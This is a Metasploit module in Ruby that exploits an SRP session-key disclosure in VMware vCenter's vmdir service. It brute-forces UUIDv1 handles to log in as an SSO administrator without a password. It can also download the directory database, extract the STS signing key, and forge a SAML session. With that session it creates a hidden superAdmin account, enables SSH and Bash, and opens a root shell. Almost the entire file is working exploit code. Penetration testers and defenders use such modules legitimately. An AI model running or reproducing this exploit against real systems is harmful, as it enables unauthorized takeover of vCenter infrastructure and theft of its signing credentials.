# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/stopwatch'
require 'msf/base/sessions/vmdir'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Vmdir
  include Msf::Exploit::Remote::HTTP::VmwareVcenter
  include Msf::Exploit::Remote::SSH
  include Msf::Auxiliary::CommandShell
  include Msf::Sessions::CreateSessionOptions
  include Msf::Auxiliary::Report
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'VMware vCenter Server SRP Authentication Bypass',
        'Description' => %q{
          This module exploits unauthenticated SRP session-key disclosure in vCenter's vmdir RPC service. Predictable
          UUIDv1 context handles allow recovery of a pending login's key, authenticating as an existing SSO
          administrator without its password. An encrypted GetState operation verifies the bypass. This module was
          verified against vCenter 8.0.2.00400; VMware fixes the 8.0 branch in 8.0 U3m.
          The SHELL action downloads the directory database, recovers its STS signer, and uses a forged SAML API session
          to create a local administrator and enable SSH/Bash. With CreateSession enabled, the resulting root shell
          retains cleanup of that account and the original access settings until exit. Otherwise, it prints and retains
          the credentials for manual login without connecting to SSH.
        },
        'Author' => [
          'Mandiant', # Vulnerability discovery and disclosure
          'jheysel-r7' # PoC and module implementation
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2026-123890'],
          ['URL', 'https://cloud.google.com/blog/topics/threat-intelligence/armory-castle-exploits-vsphere'],
          ['URL', 'https://github.com/vmware/vcf-security-and-compliance-guidelines/tree/main/security-advisories/vmsa-2026-0009']
        ],
        'DisclosureDate' => '2026-11-19',
        'Actions' => [
          ['RPC', { 'Description' => 'Verify the bypass and retain a directory RPC session' }],
          ['SHELL', { 'Description' => 'Create appliance administrator credentials and optionally open a root shell' }]
        ],
        'DefaultAction' => 'RPC',
        'DefaultOptions' => { 'RPORT' => 2012, 'SSL' => false, 'SSH_TIMEOUT' => 30 },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES, ARTIFACTS_ON_DISK],
          'Reliability' => [REPEATABLE_SESSION]
        }
      )
    )
    register_options([OptString.new('USERNAME', [true, 'Existing SSO administrator principal', 'administrator@vsphere.local'])])
    register_advanced_options([
      OptInt.new('MaxGuesses', [true, 'Maximum UUID candidates to query', 200_000]),
      OptEnum.new('UuidStep', [true, 'UUID tick step: 10 = microsecond, 1 = 100ns', '10', %w[10 1]]),
      OptInt.new('SearchTimeout', [true, 'Maximum seconds for the context search', 180]),
      OptPort.new('ApiPort', [true, 'vCenter HTTPS API port for the SHELL action', 443], conditions: ['ACTION', '==', 'SHELL']),
      OptPort.new('SshPort', [true, 'SSH port for the SHELL action', 22], conditions: ['ACTION', '==', 'SHELL']),
      OptInt.new('MaxDbSize', [true, 'Maximum directory database size to download, in MiB', 256], conditions: ['ACTION', '==', 'SHELL'])
    ])
    # Reuse the session registration helper without advertising OS-shell autoruns.
    deregister_options('InitialAutoRunScript', 'AutoRunScript', 'CommandShellCleanupCommand', 'AutoVerifySession')
  end

  def check
    # with_verifiers provides two anonymous connections and cleans up the handles
    # added below, even when this block returns early. Create a pending verifier
    # on `reference`, then ask `oracle` for its key without a password proof.
    # Receiving that key through a different connection proves the disclosure.
    # Our known handle avoids guessing the hidden login context's UUID.
    with_verifiers do |reference, oracle, handles, _clients|
      handles << reference.new_verifier(datastore['USERNAME'])
      key = oracle.session_key(handles.first)
      return Exploit::CheckCode::Unknown('SRP did not disclose a pending key; applicability is inconclusive') unless key

      report_service(host: rhost, port: rport, proto: 'tcp', name: 'vmdir')
      return Exploit::CheckCode::Vulnerable('An anonymous association retrieved a pending SRP key owned by another association')
    end
  rescue IOError, Rex::TimeoutError, Timeout::Error, Msf::Exploit::Remote::Vmdir::Error, BinData::ValidityError => e
    elog('vmdir SRP check failed', error: e)
    Exploit::CheckCode::Unknown("SRP key-disclosure check failed: #{e.message}")
  end

  def run
    fail_with(Failure::BadConfig, 'MaxGuesses, SearchTimeout and ReadTimeout must be positive') unless %w[MaxGuesses SearchTimeout ReadTimeout].all? { |option| datastore[option].positive? }
    fail_with(Failure::BadConfig, 'MaxDbSize must be positive') if action.name == 'SHELL' && !datastore['MaxDbSize'].positive?

    created_session = with_verifiers do |reference, oracle, handles, clients|
      handles << reference.new_verifier(datastore['USERNAME'])
      login = vmdir_connect(nil)
      clients << login

      # Take the second timestamp before ASN.1 decoding widens the search window.
      challenge = login.challenge(datastore['USERNAME']) { handles << reference.new_verifier(datastore['USERNAME']) }

      print_status('Searching the pending SRP context between two reference UUIDs')
      recovered = recover_key(oracle, handles)

      vprint_status("Recovered context #{Rex::Proto::DCERPC::UUID.uuid_unpack(recovered[:handle][4, 16])}, key #{recovered[:key].unpack1('H*')}")
      login.authenticate(datastore['USERNAME'], challenge, recovered[:key])
      state = login.directory_state(datastore['USERNAME'], recovered[:key])

      print_good("Authenticated as #{datastore['USERNAME']} without a password; protected directory state: #{state}")
      service = report_service(host: rhost, port: rport, proto: 'tcp', name: 'vmdir')
      evidence = { username: datastore['USERNAME'], session_key: recovered[:key].unpack1('H*'), directory_state: state, password_supplied: false }
      path = store_loot('vmware.vmdir.srp', 'application/json', rhost, evidence.to_json, 'vmdir_srp.json', 'Verified vmdir SRP authentication bypass', service)

      print_good("Saved authentication evidence to #{path}")
      report_vuln(host: rhost, port: rport, proto: 'tcp', service: service, name: name, refs: references, info: "Passwordless #{datastore['USERNAME']} GetState returned #{state}")

      # Record the validated principal without inventing a recovered password.
      # The ephemeral session key is retained in the JSON evidence above.
      create_credential_and_login(
        address: rhost, port: rport, protocol: 'tcp', service_name: 'vmdir', workspace_id: myworkspace_id,
        origin_type: :service, module_fullname: fullname, username: datastore['USERNAME'],
        status: Metasploit::Model::Login::Status::SUCCESSFUL, last_attempted_at: Time.now,
        proof: "Passwordless SRP GetState: #{state}; evidence: #{path}"
      )

      if action.name == 'SHELL'
        # The search associations are no longer needed. Release them before
        # the database transfer can exceed the server's idle timeout.
        delete_verifiers(reference, handles)
        [oracle, reference].each do |client|
          vmdir_disconnect(client)
          clients.delete(client)
        end

        shell_session(login, recovered[:key])
      elsif datastore['CreateSession']
        session = Msf::Sessions::Vmdir.new(login, username: datastore['USERNAME'], key: recovered[:key])
        registered = start_session(self, "vmdir RPC #{datastore['USERNAME']}", {}, false, login.socket, session)
        fail_with(Failure::UnexpectedReply, 'Could not register the authenticated vmdir session') unless registered

        # The registered session owns this socket now; reference/oracle clients
        # still get cleaned up before we enter the interactive prompt below.
        clients.delete(login)
        registered
      end
    end

    if created_session && user_input && user_output && !job_id
      print_status("Interacting with #{created_session.type} session #{created_session.sid}; use background to return to msfconsole")
      created_session.interact(user_input.dup, user_output)
    end
  rescue Rex::ConnectionError, Rex::TimeoutError, Timeout::Error => e
    elog('vCenter connection failed', error: e)
    fail_with(Failure::Unreachable, "vCenter connection timed out or failed: #{e.message}")
  rescue Net::SSH::AuthenticationFailed => e
    elog('The temporary appliance account could not authenticate to SSH', error: e)
    fail_with(Failure::NoAccess, 'The temporary appliance account could not authenticate to SSH')
  rescue IOError, Msf::Exploit::Remote::Vmdir::Error, Msf::Exploit::Remote::HTTP::VmwareVcenter::Error, BinData::ValidityError, OpenSSL::ASN1::ASN1Error, RASN1::Error, OpenSSL::Cipher::CipherError, Net::SSH::Exception => e
    elog('vCenter action failed', error: e)
    fail_with(Failure::UnexpectedReply, "vCenter action failed: #{e.message}")
  end

  def shell_session(login, key)
    print_status('Downloading the directory database over the authenticated RPC association')
    database = download_database(login, key)
    credentials = vcenter_sts_credentials(database)

    { key: 'key', certificate: 'crt', ca_certificate: 'ca.crt' }.each do |type, extension|
      path = store_loot('vmware.vcenter.sts', 'application/x-pem-file', rhost, credentials[type].to_pem, "sts.#{extension}")
      print_good("Saved STS #{type} to #{path}")
    end

    context = {
      host: rhost, port: datastore['ApiPort'], principal: datastore['USERNAME'], credentials: credentials,
      hostname: datastore['VHOST'].presence || vcenter_hostname(port: datastore['ApiPort'])
    }
    assertion = vcenter_bearer_assertion(credentials, username: context[:principal], hostname: context[:hostname])
    context[:session_id] = vcenter_api_login(assertion, port: context[:port])
    context[:ssh_enabled] = appliance_value(context, %w[access ssh])
    context[:shell_config] = appliance_value(context, %w[access shell])

    unless [true, false].include?(context[:ssh_enabled]) && context[:shell_config].is_a?(Hash) && [true, false].include?(context[:shell_config]['enabled']) && context[:shell_config]['timeout'].is_a?(Integer)
      fail_with(Failure::UnexpectedReply, 'The appliance returned invalid SSH/Bash settings')
    end

    report_service(host: rhost, port: context[:port], proto: 'tcp', name: 'https', info: 'VMware vCenter REST API /rest/')
    create_credential_and_login(
      address: rhost, port: context[:port], protocol: 'tcp', service_name: 'https', workspace_id: myworkspace_id,
      origin_type: :service, module_fullname: fullname, username: "vmware-api-session-id (#{context[:principal]})",
      private_data: context[:session_id], private_type: :password, status: Metasploit::Model::Login::Status::SUCCESSFUL,
      last_attempted_at: Time.now, proof: 'Authenticated appliance SSH/Bash settings reads'
    )

    context[:account] = Faker::Internet.username(specifier: 16..20, separators: ['-']).tr('_', '-')[0, 30]
    context[:password] = "#{Rex::Text.rand_text_alpha_upper(4)}#{Rex::Text.rand_text_alpha_lower(4)}#{Rex::Text.rand_text_numeric(4)}!#{Rex::Text.rand_text_alphanumeric(12)}"
    context[:full_name] = "#{Faker::Name.name} #{Rex::Text.rand_text_alphanumeric(8)}"
    account_path = ['local-accounts', context[:account]]
    response = appliance_request(context, 'GET', account_path, codes: [200, 404])
    fail_with(Failure::BadConfig, 'The generated appliance account already exists') unless response.code == 404

    recovery = context.slice(:host, :port, :principal, :hostname, :account, :password, :full_name, :ssh_enabled, :shell_config, :session_id)
    path = store_loot('vmware.vcenter.shell', 'application/json', rhost, recovery.to_json, 'vcenter_shell_recovery.json')
    print_status("Creating appliance administrator #{context[:account]}; recovery details: #{path}")
    context[:account_attempted] = true
    appliance_request(context, 'POST', account_path, data: { config: { password: context[:password], full_name: context[:full_name], roles: ['superAdmin'], enabled: true, password_expires: false } })

    create_credential_and_login(
      address: rhost, port: datastore['SshPort'], protocol: 'tcp', service_name: 'ssh', workspace_id: myworkspace_id,
      origin_type: :service, module_fullname: fullname, username: context[:account], private_data: context[:password],
      private_type: :password, status: Metasploit::Model::Login::Status::UNTRIED,
      proof: 'Local superAdmin created through the appliance API'
    )

    unless context[:ssh_enabled]
      context[:ssh_attempted] = true
      appliance_request(context, 'PUT', %w[access ssh], data: { enabled: true })
    end

    unless context[:shell_config]['enabled']
      context[:shell_attempted] = true
      appliance_request(context, 'PUT', %w[access shell], data: { config: { enabled: true, timeout: 600 } })
    end

    unless datastore['CreateSession']
      print_good("Appliance SSH credentials: #{context[:account]}:#{context[:password]}")
      print_status('SSH and Bash access remain enabled; use the recovery details to restore settings and remove the account when finished')
      return
    end

    ssh = retry_until_truthy(timeout: datastore['SSH_TIMEOUT']) do
      Net::SSH.start(context[:host], context[:account], ssh_client_defaults.merge(port: datastore['SshPort'], password: context[:password], auth_methods: ['password'], timeout: datastore['SSH_TIMEOUT']))
    rescue Rex::ConnectionRefused, Errno::ECONNREFUSED
      nil
    end

    fail_with(Failure::Unreachable, 'The enabled SSH service did not become reachable') unless ssh

    result = vcenter_root_shell(ssh, username: context[:account], password: context[:password], timeout: datastore['SSH_TIMEOUT'])
    shell = result[:session]
    shell.after_close = proc { restore_appliance(context) }
    print_good("Root execution verified: #{result[:proof].strip}")
    report_service(host: context[:host], port: datastore['SshPort'], proto: 'tcp', name: 'ssh')
    create_credential_and_login(
      address: context[:host], port: datastore['SshPort'], protocol: 'tcp', service_name: 'ssh', workspace_id: myworkspace_id,
      origin_type: :service, module_fullname: fullname, username: context[:account], private_data: context[:password], private_type: :password,
      status: Metasploit::Model::Login::Status::SUCCESSFUL, last_attempted_at: Time.now, proof: result[:proof]
    )

    registered = start_session(self, "Root SSH shell via #{context[:account]}", { 'USERNAME' => context[:account] }, false, shell.rstream, shell)
    fail_with(Failure::UnexpectedReply, 'Could not register the root shell') unless registered

    sockets.delete(ssh.transport.socket)
    print_status('The temporary account and original SSH/Bash settings will be restored when this session closes')
    registered
  ensure
    # CreateSession=false leaves the account and recovery details with the operator.
    # With a session requested, restore partial setup unless the session owns it.
    if datastore['CreateSession'] && !registered
      if shell
        shell.cleanup
      else
        begin
          ssh.close if ssh && !ssh.closed?
        rescue IOError, Net::SSH::Exception => e
          elog('Could not close the unregistered vCenter SSH connection', error: e)
          print_warning("Could not close the unregistered SSH connection: #{e.message}")
        end
        restore_appliance(context) if context&.[](:account_attempted)
      end
    end
    logout_appliance(context) if context&.[](:session_id)
  end

  def download_database(login, key)
    handle = login.open_database(datastore['USERNAME'], key)
    data = String.new(encoding: ::Encoding::BINARY)
    loop do
      chunk = login.read_database(handle, datastore['USERNAME'], key)
      break if chunk.empty?

      fail_with(Failure::BadConfig, 'Directory database exceeds MaxDbSize') if data.bytesize + chunk.bytesize > datastore['MaxDbSize'] * 1024 * 1024
      data << chunk
      vprint_status("Downloaded #{data.bytesize / (1024 * 1024)} MiB of the directory database") if (data.bytesize % (1024 * 1024)).zero?
    end
    store_loot('vmware.vmdir.database', 'application/octet-stream', rhost, data, 'data.mdb')
  ensure
    if handle
      begin
        login.close_database(handle, datastore['USERNAME'], key)
      rescue IOError, Rex::ConnectionError, Rex::TimeoutError, Msf::Exploit::Remote::Vmdir::Error => e
        elog('Could not close the directory database RPC context', error: e)
        print_warning("Could not close the database RPC context: #{e.message}")
      end
    end
  end

  def appliance_request(context, method, path, **)
    vcenter_api_request(method, ['appliance', *path], host: context[:host], port: context[:port], session_id: context[:session_id], **)
  end

  def appliance_value(context, path)
    response = appliance_request(context, 'GET', path)
    vcenter_api_value(response)
  end

  def logout_appliance(context)
    vcenter_api_request('DELETE', %w[com vmware cis session], host: context[:host], port: context[:port], session_id: context[:session_id], codes: [200, 401])
  rescue Rex::ConnectionError, Rex::TimeoutError, Msf::Exploit::Remote::HTTP::VmwareVcenter::Error => e
    elog('Could not end the appliance API session', error: e)
    print_warning("Could not end the appliance API session: #{e.message}")
  ensure
    context[:session_id] = nil
  end

  def restore_appliance(context)
    return if context[:restored]

    # A backgrounded shell may outlive its API session. Sign a fresh assertion
    # for cleanup using the original host and principal, without a password.
    unless context[:session_id]
      assertion = vcenter_bearer_assertion(context[:credentials], username: context[:principal], hostname: context[:hostname])
      context[:session_id] = vcenter_api_login(assertion, host: context[:host], port: context[:port])
    end
    operations = {}

    if context[:shell_attempted]
      operations['Bash access'] = proc do
        appliance_request(context, 'PUT', %w[access shell], data: { config: context[:shell_config] })
        raise Msf::Exploit::Remote::HTTP::VmwareVcenter::Error, 'Bash settings did not return to their original value' unless appliance_value(context, %w[access shell]) == context[:shell_config]
      end
    end

    if context[:ssh_attempted]
      operations['SSH access'] = proc do
        appliance_request(context, 'PUT', %w[access ssh], data: { enabled: context[:ssh_enabled] })
        raise Msf::Exploit::Remote::HTTP::VmwareVcenter::Error, 'SSH settings did not return to their original value' unless appliance_value(context, %w[access ssh]) == context[:ssh_enabled]
      end
    end

    operations['Temporary administrator'] = proc do
      path = ['local-accounts', context[:account]]
      response = appliance_request(context, 'GET', path, codes: [200, 404])
      next if response.code == 404

      info = vcenter_api_value(response)
      raise Msf::Exploit::Remote::HTTP::VmwareVcenter::Error, 'The account no longer matches its saved identity' unless info.is_a?(Hash) && info['fullname'] == context[:full_name]

      removed = retry_until_truthy(timeout: 15) { [200, 404].include?(appliance_request(context, 'DELETE', path, codes: [200, 404, 500]).code) }
      raise Msf::Exploit::Remote::HTTP::VmwareVcenter::Error, 'The appliance could not delete the temporary account' unless removed
      raise Msf::Exploit::Remote::HTTP::VmwareVcenter::Error, 'The temporary account is still present' unless appliance_request(context, 'GET', path, codes: [200, 404]).code == 404
    end

    restored = true
    operations.each do |label, operation|
      operation.call
    rescue IOError, Rex::ConnectionError, Rex::TimeoutError, Msf::Exploit::Remote::HTTP::VmwareVcenter::Error => e
      restored = false
      elog("Could not restore #{label}", error: e)
      print_warning("Could not restore #{label}: #{e.message}; use the saved recovery details")
    end
    context[:restored] = restored
    print_good("Restored appliance access and removed temporary administrator #{context[:account]}") if restored
  rescue IOError, Rex::ConnectionError, Rex::TimeoutError, Msf::Exploit::Remote::HTTP::VmwareVcenter::Error => e
    elog('Could not authenticate for appliance cleanup', error: e)
    print_warning("Appliance cleanup failed: #{e.message}; use the saved recovery details")
  ensure
    logout_appliance(context) if context[:session_id]
  end

  def recover_key(oracle, handles)
    before, after = handles.map { |handle| uuid_time(handle) }
    unless handles[0][12, 8] == handles[1][12, 8] && before < after
      fail_with(Failure::UnexpectedReply, 'Reference UUIDs do not share a monotonic UUIDv1 generator')
    end
    vprint_status("UUID search window: #{after - before} ticks between #{Rex::Proto::DCERPC::UUID.uuid_unpack(handles[0][4, 16])} and #{Rex::Proto::DCERPC::UUID.uuid_unpack(handles[1][4, 16])}")

    step = datastore['UuidStep'].to_i
    attempts = 0
    recovered = nil

    _result, elapsed = Rex::Stopwatch.elapsed_time do
      Timeout.timeout(datastore['SearchTimeout']) do
        (after - step).step(before + 1, -step) do |timestamp|
          break if attempts >= datastore['MaxGuesses']

          attempts += 1
          vprint_status("Queried #{attempts} UUID candidates") if (attempts % 10_000).zero?
          # Only the UUID timestamp changes; retain the observed clock sequence
          # and node. UUID fields use mixed endian order on the RPC wire.
          handle = handles[0].dup
          handle[4, 8] = [timestamp & 0xffffffff, (timestamp >> 32) & 0xffff, ((timestamp >> 48) & 0xfff) | 0x1000].pack('Vvv')
          key = oracle.session_key(handle)
          next unless key

          recovered = { handle: handle, key: key }
          break
        end
      end
    end
    fail_with(Failure::NotFound, "No pending context recovered after #{attempts} guesses; result is inconclusive") unless recovered

    print_status("Recovered the pending session key after #{attempts} guesses in #{elapsed.round(2)} seconds")
    recovered
  rescue Timeout::Error
    fail_with(Failure::TimeoutExpired, "Context search timed out after #{attempts} guesses; result is inconclusive")
  end

  def uuid_time(handle)
    low, mid, high = handle[4, 8].unpack('Vvv')
    fail_with(Failure::UnexpectedReply, 'SRP reference is not a UUIDv1 context') unless high >> 12 == 1

    ((high & 0xfff) << 48) | (mid << 32) | low
  end

  # Share setup/cleanup for check and run. SRP verifiers hold server-side exchange
  # state behind UUID context handles. `reference` creates contexts that provide
  # UUID timing bounds; `oracle` reads keys through a separate anonymous connection
  # to demonstrate the ownership bypass and probe the hidden login context.
  # Keep these resources alive for the block, then free our reference contexts and
  # close tracked clients on every exit. Session-owned clients are untracked first.
  def with_verifiers
    clients = []
    handles = []
    reference = vmdir_connect(SRP_INTERFACE)
    clients << reference
    oracle = vmdir_connect(SRP_INTERFACE)
    clients << oracle
    yield reference, oracle, handles, clients
  ensure
    delete_verifiers(reference, handles) if handles
    clients&.reverse_each { |client| vmdir_disconnect(client) }
  end

  def delete_verifiers(reference, handles)
    # Delete only our reference verifiers. GSS owns the hidden login context;
    # deleting it explicitly would risk a double free when GSS disconnects.
    handles.shift(handles.length).each do |handle|
      reference.delete_verifier(handle)
    rescue IOError, Rex::TimeoutError, Msf::Exploit::Remote::Vmdir::Error => e
      elog('SRP reference cleanup failed', error: e)
      print_warning("Could not delete an SRP reference context: #{e.message}")
    end
  end
end
